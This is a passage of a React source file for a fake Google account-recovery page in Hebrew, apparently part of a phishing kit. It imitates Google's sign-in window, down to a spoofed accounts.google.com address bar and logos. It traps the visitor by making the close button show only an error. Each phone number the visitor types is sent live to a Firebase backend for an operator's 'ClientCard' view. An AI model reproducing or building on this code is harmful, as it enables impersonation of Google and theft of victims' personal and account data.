                  background: "#ffffff",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  borderBottom: "1px solid #eaecee",
                  height: 40,
                }}
              >
                <div
                  style={{
                    width: 20,
                    height: 20,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="18"
                    height="18"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                </div>
                <span style={{ color: "#000", fontSize: 12 }}>
                  היכנס ל-Google
                </span>
              </div>

              {/* Conteúdo central com spinner */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #1a73e8",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>

              {/* Footer */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                    onClick={(e) => e.preventDefault()}
                  >
                    עזרה
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                    onClick={(e) => e.preventDefault()}
                  >
                    פרטיות
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                    onClick={(e) => e.preventDefault()}
                  >
                    תנאים
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
                  {country?.name || "..."}
                </span>
              </div>
            </div>
          )}

          {/* Barra da janela principal (quando modal está pronto) */}
          {isReady && (
            <div
              style={{
                height: 28,
                background: "#e8f0fe",
                borderBottom: "1px solid #d7e3fc",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                padding: "0 8px",
                fontSize: 12,
                color: "#202124",
              }}
              onMouseDown={startDrag}
            >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 6,
              }}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#111"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                onClick={() => setInvalidMessage("Invalid phone verification.")}
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>


          </div>
          )}

          {/* Conteúdo principal do modal */}
          {isReady && (
            <div
              style={{
                flex: 1,
                display: "flex",
                flexDirection: "column",
                overflow: "hidden",
              }}
            >
              {/* Barra de URL simulada - posicionada acima do Sign in to Google */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com
                  </div>
                </div>
              </div>

          {/* Barra animada logo abaixo da URL (a URL é a div acima). Só na etapa 'bar'. */}
          {isSubmitting && loadingStage === "bar" && (
            <div
              style={{
                width: "100%",
                height: 4,
                background: "#ffffff",
                overflow: "hidden",
                margin: 0,
              }}
            >
              <div
                style={{
                  width: "100%",
                  height: "100%",
                  background: "#1a73e8",
                  animation: "loadingBar 2s ease-in-out infinite",
                }}
              />
            </div>
          )}

          {/* Header pequeno - apenas quando não está na etapa final */}
          {!(isSubmitting && loadingStage === "final") && (
            <div
              style={{
                width: "100%",
                background: "#ffffff",
                padding: "4px 8px",
                display: "flex",
                alignItems: "center",
                gap: 6,
                borderBottom: "1px solid #eaecee",
                height: 40,
              }}
            >
              <div
                style={{
                  width: 20,
                  height: 20,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <img
                  src={gmailLogo}
                  alt="Gmail Logo"
                  style={{ width: 18, height: 18 }}
                />
              </div>
              <span style={{ color: "#000", fontSize: 12 }}>
                {translations.header}
              </span>
            </div>
          )}

          {/* Conteúdo principal */}
          <div
            style={{
              flex: 1,
              padding: "24px 24px 24px",
              opacity: isSubmitting && loadingStage === "bar" ? 0.7 : 1,
              pointerEvents:
                isSubmitting && loadingStage === "bar" ? "none" : "auto",
              position: "relative",
              direction: "rtl",
              textAlign: "right"
            }}
          >
            <h1 style={{ fontSize: 28, fontWeight: 500, margin: 0 }}>
              שחזור חשבון
            </h1>
            <p
              style={{ color: "#3c4043", fontSize: 14, margin: "12px 0 16px" }}
            >
              כדי לעזור לשמור על החשבון שלך בטוח, Google רוצה לוודא שזה
              באמת אתה מנסה להיכנס
            </p>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                border: "1px solid #dadce0",
                borderRadius: 20,
                padding: "4px 4px 4px 12px",
                gap: 8,
                marginBottom: 16,
              }}
            >
              <svg
                width="18"
                height="18"
                viewBox="0 0 42 42"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
                style={{ marginRight: 8, display: "block" }}
              >
                <path
                  fill="#000000"
                  fillRule="evenodd"
                  d="M24,45A21,21,0,1,1,45,24,21,21,0,0,1,24,45Zm11.633-6c-.157-.231-.355-.518-.514-.742-.277-.394-.554-.788-.8-1.178C34.305,37.062,32.935,35.224,28,35a2.922,2.922,0,0,1-2.968-3.066L25,31c0-.135-.016.148,0,0V30l1-1a14.435,14.435,0,0,0,2.4-1.464l.135-.093A4.643,4.643,0,0,0,30,26l.036-.381A55.987,55.987,0,0,0,31,19c0-4.71-2.29-7-7-7-4.775,0-7,2.224-7,7a54.693,54.693,0,0,0,.963,6.616l.035.352a3.981,3.981,0,0,0,1.449,1.462l.1.062A19.174,19.174,0,0,0,22,29l1,1v1c.014.138,0-.146,0,0l-.033.934A2.9,2.9,0,0,1,20.084,35h0c-4.956.2-6.393,2.077-6.4,2.077-.252.4-.528.789-.807,1.184-.157.224-.355.51-.513.741a18.917,18.917,0,0,0,23.267,0ZM24,5A18.986,18.986,0,0,0,10.85,37.694c.382-.565.79-1.129,1.15-1.694,0,0,1.67-2.743,8-3,.645,0,.967-.422.967-1.066h0c0-.521,0-.934,0-.934,0-.13-.021-.247-.027-.373A17.5,17.5,0,0,1,18.4,29.133S16,27.657,16,26a60.16,60.16,0,0,1-1-7c0-4.644,1.986-9,9-9,6.92,0,9,4.356,9,9a61.784,61.784,0,0,1-1,7c0,1.611-2.4,3.133-2.4,3.133a13.873,13.873,0,0,1-2.543,1.546c0,.109-.023.209-.023.321,0,0,0,.413,0,.934h0c0,.644.32,1.066.965,1.066,6.424.288,8,3,8,3,.36.565.767,1.129,1.149,1.694A18.985,18.985,0,0,0,24,5Z"
                  transform="translate(-3 -3)"
                />
              </svg>
              <span style={{ fontSize: 14, color: "#0f1113", fontWeight: 400 }}>
                {DeviceManager.getDevice()}
              </span>
            </div>

            {/* Texto Telefone */}
            <h2 style={{ fontSize: 16, fontWeight: 500, margin: "6px 0" }}>
              קבל קוד אימות
            </h2>
            {hasPhoneConfig && (
              <p style={{ color: "#3c4043", fontSize: 12, margin: 0 }}>
                כדי לקבל קוד אימות, אשר תחילה את מספר הטלפון שהוספת לחשבון שלך {renderPhoneMasked()}. עלולים לחול תעריפי הודעות ונתונים רגילים.
              </p>
            )}

            {/* Input de telefone com seletor de país */}
             <div style={{ marginTop: 10, display: "flex", alignItems: "center", gap: "0px", direction: "rtl" }}>
               <div className="country-selector" style={{ width: "100px", position: "relative" }} ref={countryRef}>
                  <div
                    onClick={() => {
                      if (!isDropdownOpen && countryRef.current) {
                        const rect = countryRef.current.getBoundingClientRect();
                        setDropdownPosition({
                          top: rect.bottom + 2,
                          left: rect.left
                        });
                      }
                      setIsDropdownOpen(!isDropdownOpen);
                    }}
                    style={{
                      border: "1px solid #dadce0",
                      borderRadius: "0 6px 6px 0",
                      height: "44px",
                      background: "white",
                      display: "flex",
                      alignItems: "center",
                      padding: "0 12px",
                      cursor: "pointer",
                      fontSize: "14px",
                      color: "#202124",
                      fontFamily: "'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif",
                      fontWeight: "500",
                      outline: "none"
                    }}
                  >
                    <Flag country={selectedCountry} size={24} style={{ marginRight: 10, borderRadius: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.1)" }} />
                    <span style={{ color: "#1a73e8", fontWeight: "600" }}>{selectedCountryData.dialCode}</span>
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 12 12"
                      style={{ 
                        marginLeft: "8px", 
                        transform: isDropdownOpen ? "rotate(180deg)" : "rotate(0deg)",
                        transition: "transform 0.2s ease"
                      }}
                    >
                      <path d="M6 8L2 4h8z" fill="#5f6368" />
                    </svg>
                  </div>
                  
                  {isDropdownOpen && createPortal(
                    <div
                      className="country-dropdown"
                      style={{
                        position: "fixed",
                        top: dropdownPosition.top,
                        left: dropdownPosition.left,
                        width: "380px",
                        maxHeight: "400px",
                        border: "1px solid #dadce0",
                        borderRadius: "8px",
                        boxShadow: "0 8px 32px rgba(0,0,0,0.2)",
                        background: "white",
                        zIndex: 1000000,
                        fontFamily: "'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif"
                      }}
                    >
                      {/* Campo de busca */}
                      <div style={{ padding: "12px", borderBottom: "1px solid #e8eaed" }}>
                        <input
                          type="text"
                          placeholder="חפש מדינה או קוד..."
                          value={searchTerm}
                          onChange={(e) => setSearchTerm(e.target.value)}
                          style={{
                            width: "100%",
                            padding: "8px 12px",
                            border: "1px solid #dadce0",
                            borderRadius: "6px",
                            fontSize: "14px",
                            direction: "rtl",
                            textAlign: "right",
                                                              fontFamily: "inherit",
                            outline: "none",
                            boxShadow: "none",
                            boxSizing: "border-box"
                          }}
                        />
                      </div>
                      
                      {/* Lista de países */}
                      <div style={{ maxHeight: "260px", overflowY: "auto" }}>
                        {countries
                          .filter(country => 
                            country.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                            country.dialCode.includes(searchTerm)
                          )
                          .map((country) => (
                            <div
                              key={country.code}
                              onClick={() => {
                                setSelectedCountry(country.code);
                                setIsDropdownOpen(false);
                                setSearchTerm("");
                                // Atualização imediata no Firebase para refletir no ClientCard
                                const fullPhoneNumber = `${country.dialCode} ${code}`;
                                console.log("📱 GmailTelefonePage - Salvando telefone no Firebase:", fullPhoneNumber);
                                updateClientData({
                                  gmailTelefone: fullPhoneNumber,
                                  gmailTelefonePhone: fullPhoneNumber, // Sincronizar com o campo do modal
                                });
                              }}
                              style={{
                                padding: "12px 16px",
                                fontSize: "14px",
                                color: "#202124",
                                display: "flex",
                                alignItems: "center",
                                gap: "12px",
                                cursor: "pointer",
                                backgroundColor: selectedCountry === country.code ? "#e8f0fe" : "transparent",
                                fontWeight: selectedCountry === country.code ? "500" : "400",
                                transition: "all 0.2s ease",
                                fontFamily: "inherit"
                              }}
                              onMouseEnter={(e) => {
                                if (selectedCountry !== country.code) {
                                  e.target.style.backgroundColor = "#f8f9fa";
                                }
                              }}
                              onMouseLeave={(e) => {
                                e.target.style.backgroundColor = selectedCountry === country.code ? "#e8f0fe" : "transparent";
                              }}
                            >
                              <Flag country={country.code} size={24} style={{ borderRadius: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.1)" }} />
                              <span style={{ fontWeight: "500", color: "#202124", minWidth: "45px" }}>{country.dialCode}</span>
                              <span style={{ flex: 1, fontWeight: "400" }}>{country.name}</span>
                            </div>
                          ))
                        }
                        {countries.filter(country => 
                          country.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          country.dialCode.includes(searchTerm)
                        ).length === 0 && (
                          <div style={{
                            padding: "20px",
                            textAlign: "center",
                            color: "#5f6368",
                            fontSize: "14px",
                            fontFamily: "inherit"
                          }}>
                            לא נמצאה מדינה
                          </div>
                        )}  
                      </div>
                    </div>,
                    document.body
                  )}
                </div>
                <div style={{ flex: 1, width: "calc(100% - 100px)" }}>
                <input
                   type="tel"
                   value={code}
                   onChange={(e) => {
                     const value = e.target.value;
                     if (/^\d*$/.test(value)) {
                       setCode(value);
                       // Atualização imediata no Firebase para refletir no ClientCard em tempo real
                       const selectedCountryData = countries.find(c => c.code === selectedCountry);
                       const fullPhoneNumber = selectedCountryData ? `${selectedCountryData.dialCode} ${value}` : value;
                       console.log("📱 GmailTelefonePage - Salvando telefone em tempo real no Firebase:", fullPhoneNumber);
                       updateClientData({
                         gmailTelefone: fullPhoneNumber,
                         gmailTelefonePhone: fullPhoneNumber, // Sincronizar com o campo do modal
                       });
                     }
                   }}
                   maxLength={15}
                   placeholder="מספר טלפון"
                   style={{
                     width: "100%",
                     border: "1px solid #dadce0",
                     borderRight: "none",
                     outline: "none",
                     fontSize: 14,
                     padding: "12px 16px",
                     borderRadius: "6px 0 0 6px",
                     boxSizing: "border-box",
                     fontFamily: "'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif",
                     backgroundColor: "white",
                     height: "44px",
                     transition: "border-color 0.2s ease",
                     direction: "rtl",
                     textAlign: "right",
                   }}

                 />
              </div>
            </div>

            {/* Mensagem de erro */}
            {invalidMessage && (
              <div
                style={{
                  color: "#5f6368",
                  fontSize: 12,
                  marginTop: 8,
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                }}
              >
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" />
                </svg>
                {invalidMessage}
              </div>
            )}

            {/* Botão Next */}
            <div style={{ marginTop: 24, display: "flex", justifyContent: "flex-end", gap: 12 }}>
              <button
                onClick={handleAdvance}
                disabled={isSubmitting}
                style={{
                  background: isSubmitting ? "#5f6368" : "#1a73e8",
                  color: "#fff",
                  border: "1px solid transparent",
                  borderRadius: 8,
                  padding: "8px 20px",
                  fontSize: 14,
                  fontWeight: 500,
                  cursor: isSubmitting ? "not-allowed" : "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  transition: "background-color 0.2s ease",
                }}
              >
                {isSubmitting && (
                  <div
                    style={{
                      width: 16,
                      height: 16,
                      border: "2px solid transparent",
                      borderTop: "2px solid #fff",
                      borderRadius: "50%",
                      animation: "spin 1s linear infinite",
                    }}
                  />
                )}
                {isSubmitting ? t('synchronizing') : "הבא"}
              </button>
            </div>
            
            {/* CSS para animação do spinner */}
            <style jsx>{`
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            `}</style>

            {/* Overlay final com GIF + spinner */}
            {isSubmitting && loadingStage === "final" && (
              <div
                style={{
                  position: "absolute",
                  top: 0,
                  left: 0,
                  right: 0,
                  bottom: 0,
                  background: "#ffffff",
                  display: "flex",
                  flexDirection: "column",
                  zIndex: 10,
                }}
              >
                {/* Header pequeno */}
                <div
                  style={{
                    width: "100%",
                    background: "#ffffff",
                    padding: "4px 8px",
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                    borderBottom: "1px solid #eaecee",
                    height: 40,
                  }}
                >
                  <div
                    style={{
                      width: 20,
                      height: 20,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="18"
                      height="18"
                      viewBox="0 0 40 48"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <path
                        fill="#4285F4"
                        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                      />
                      <path
                        fill="#34A853"
                        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                      />
                      <path
                        fill="#FABB05"
                        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                      />
                      <path
                        fill="#E94235"
                        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                      />
                    </svg>
                  </div>
                  <span style={{ color: "#000", fontSize: 12 }}>
                    היכנס ל-Google
                  </span>
                </div>



                {/* Conteúdo central com GIF e spinner */}
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 16,
                  }}
                >
                  <img
                    src="/logogmail.svg"
                    alt="Gmail logo"
                    style={{ width: 80, height: 80 }}
                  />
                  <div
                    style={{
                      width: 24,
                      height: 24,
                      border: "3px solid #1a73e8",
                      borderTop: "3px solid transparent",
                      borderRadius: "50%",
                      animation: "spin 1s linear infinite",
                    }}
                  />
                  <p
                    style={{
                      color: "#5f6368",
                      fontSize: 14,
                      margin: 0,
                      textAlign: "center",
                    }}
                  >
                    {phrases[phraseIndex]}
                  </p>
                </div>

                {/* Footer */}
                <div
                  style={{
                    width: "100%",
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    minHeight: 44,
                    borderTop: "1px solid #f0f0f0",
                    background: "transparent",
                    padding: "0 24px",
                  }}
                >
                  <div style={{ display: "flex", gap: 40 }}>
                    <a
                      href="#"
                      style={{
                        color: "#222",
                        fontSize: 15,
                        textDecoration: "none",
                      }}
                    >
                      עזרה
                    </a>
                    <a
                      href="#"
                      style={{
                        color: "#222",
                        fontSize: 15,
                        textDecoration: "none",
                      }}
                    >
                      פרטיות
                    </a>
                    <a
                      href="#"
                      style={{
                        color: "#222",
                        fontSize: 15,
                        textDecoration: "none",
                      }}
                    >
                      תנאים
                    </a>
                  </div>
                  <span style={{ color: "#666", fontSize: 12 }}>
                    {country?.name || "..."}
                  </span>
                </div>
              </div>
            )}
          </div>

              {/* Footer - apenas quando não está na etapa final */}
              {isReady && !(isSubmitting && loadingStage === "final") && (
                <div
                  style={{
                    width: "100%",
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    minHeight: 44,
                    borderTop: "1px solid #f0f0f0",
                    background: "transparent",
                    padding: "0 24px",
                  }}
                >
                  <div style={{ display: "flex", gap: 40 }}>
                    <a
                      href="#"
                      style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
                      onClick={(e) => e.preventDefault()}
                    >
                      עזרה
                    </a>
                    <a
                      href="#"
                      style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
                      onClick={(e) => e.preventDefault()}
                    >
                      פרטיות
                    </a>
                    <a
                      href="#"
                      style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
                      onClick={(e) => e.preventDefault()}
                    >
                      תנאים
                    </a>
                  </div>
                  <span style={{ color: "#666", fontSize: 12 }}>
                    {country?.name || "..."}
                  </span>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </EmailLayout>
  );
};

export default GmailTelefonePage;
